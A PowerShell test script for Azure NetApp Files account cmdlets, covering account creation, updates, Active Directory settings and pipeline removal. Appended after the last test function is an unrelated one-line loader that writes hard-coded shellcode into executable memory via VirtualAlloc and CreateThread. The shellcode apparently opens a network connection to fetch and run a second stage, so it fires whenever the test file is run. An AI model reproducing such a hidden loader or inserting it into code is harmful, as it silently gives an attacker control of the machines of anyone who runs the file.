














function Test-AccountActiveDirectory
{
    $resourceGroup = Get-ResourceGroupName
    $accName1 = Get-ResourceName
    $accName2 = Get-ResourceName
    $accName3 = Get-ResourceName
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"
    
    $activeDirectory1 = @{
        Username = "sdkuser"
		
        Password = "sdkpass"
        Domain = "sdkdomain"
        Dns = "127.0.0.1"
        SmbServerName = "PSSMBSName"
    }
    $activeDirectory2 = @{
        Username = "sdkuser1"
		
        Password = "sdkpass1"
        Domain = "sdkdomain"
        Dns = "127.0.0.1"
        SmbServerName = "PSSMBSName"
    }

    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation

        
        
        try
        {
            $activedirectories = @( $activeDirectory1, $activeDirectory2 )

            
            $newTagName = "tag1"
            $newTagValue = "tagValue1"
            $retrievedAcc = New-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $accName1 -Tag @{$newTagName = $newTagValue} -ActiveDirector $activeDirectories
            Assert-True { $false }
        }
        catch
        {
            $ErrorMessage = $_.Exception.Message
            Assert-True { ($ErrorMessage -contains 'Only one active directory allowed') }
            
        }

        

        $activedirectories = @( $activeDirectory1 )

        
        $newTagName = "tag1"
        $newTagValue = "tagValue1"
        $retrievedAcc = New-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $accName1 -Tag @{$newTagName = $newTagValue} -ActiveDirectory $activeDirectories
        Assert-AreEqual $accName1 $retrievedAcc.Name
        Assert-AreEqual $activeDirectory1.SmbServerName $retrievedAcc.ActiveDirectories[0].SmbServerName
        Assert-AreEqual $activeDirectory1.Username $retrievedAcc.ActiveDirectories[0].Username

        
        
        $newTagName = "tag1"
        $newTagValue = "tagValue2"
        $retrievedAcc = Update-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName1 -Tag @{$newTagName = $newTagValue}
        Assert-AreEqual $accName1 $retrievedAcc.Name
        Assert-AreEqual $activeDirectory1.SmbServerName $retrievedAcc.ActiveDirectories[0].SmbServerName
        Assert-AreEqual $activeDirectory1.Username $retrievedAcc.ActiveDirectories[0].Username
        Assert-AreEqual 1 $retrievedAcc.ActiveDirectories.Length
        Assert-AreEqual "tagValue2" $retrievedAcc.Tags[$newTagName].ToString()

        
        $retrievedAcc = Set-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -AccountName $accName1 -Location $resourceLocation
        Assert-AreEqual $accName1 $retrievedAcc.Name
        Assert-Null $retrievedAcc.Tags
        Assert-Null $retrievedAcc.ActiveDirectories

        
        $activedirectories = @( $activeDirectory2 )
        $retrievedAcc = Update-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName1 -ActiveDirectory $activedirectories
        Assert-AreEqual $accName1 $retrievedAcc.Name
        
        
        
        Assert-AreEqual $activeDirectory2.Username $retrievedAcc.ActiveDirectories[0].Username
        Assert-AreEqual 1 $retrievedAcc.ActiveDirectories.Length
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}
    

function Test-AccountCrud
{
    $resourceGroup = Get-ResourceGroupName
    $accName1 = Get-ResourceName
    $accName2 = Get-ResourceName
    $accName3 = Get-ResourceName
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"
    
    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation

        
        $newTagName = "tag1"
        $newTagValue = "tagValue1"
        $retrievedAcc = New-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $accName1 -Tag @{$newTagName = $newTagValue}
        Assert-AreEqual $accName1 $retrievedAcc.Name
        Assert-AreEqual True $retrievedAcc.Tags.ContainsKey($newTagName)
        Assert-AreEqual "tagValue1" $retrievedAcc.Tags[$newTagName].ToString()

        
        $retrievedAcc = New-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName2 -Confirm:$false
        Assert-AreEqual $accName2 $retrievedAcc.Name
		
        
        $retrievedAcc = New-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName3 -WhatIf

        
        $retrievedAcc = Get-AzNetAppFilesAccount -ResourceGroupName $resourceGroup
        
        Assert-True {"$accName1" -eq $retrievedAcc[0].Name -or "$accName2" -eq $retrievedAcc[0].Name}
        Assert-True {"$accName1" -eq $retrievedAcc[1].Name -or "$accName2" -eq $retrievedAcc[1].Name}
        Assert-AreEqual 2 $retrievedAcc.Length

        
        $retrievedAcc = Get-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Name $accName1
        Assert-AreEqual $accName1 $retrievedAcc.Name

        
        $retrievedAccById = Get-AzNetAppFilesAccount -ResourceId $retrievedAcc.Id
        Assert-AreEqual $accName1 $retrievedAccById.Name

        

        
        Remove-AzNetAppFilesAccount -ResourceId $retrievedAccById.Id

        
        Remove-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -AccountName $accName2 -WhatIf
        $retrievedAcc = Get-AzNetAppFilesAccount -ResourceGroupName $resourceGroup
        Assert-AreEqual 1 $retrievedAcc.Length

        Remove-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -AccountName $accName2
        $retrievedAcc = Get-AzNetAppFilesAccount -ResourceGroupName $resourceGroup
        Assert-AreEqual 0 $retrievedAcc.Length
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}


function Test-AccountPipelines
{
    $resourceGroup = Get-ResourceGroupName
    $accName1 = Get-ResourceName
    $accName2 = Get-ResourceName
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"

    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation

        New-AnfAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $accName1 | Remove-AnfAccount

        New-AnfAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $accName2

        Get-AnfAccount -ResourceGroupName $resourceGroup -Name $accName2 | Remove-AnfAccount
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x69,0x44,0x82,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

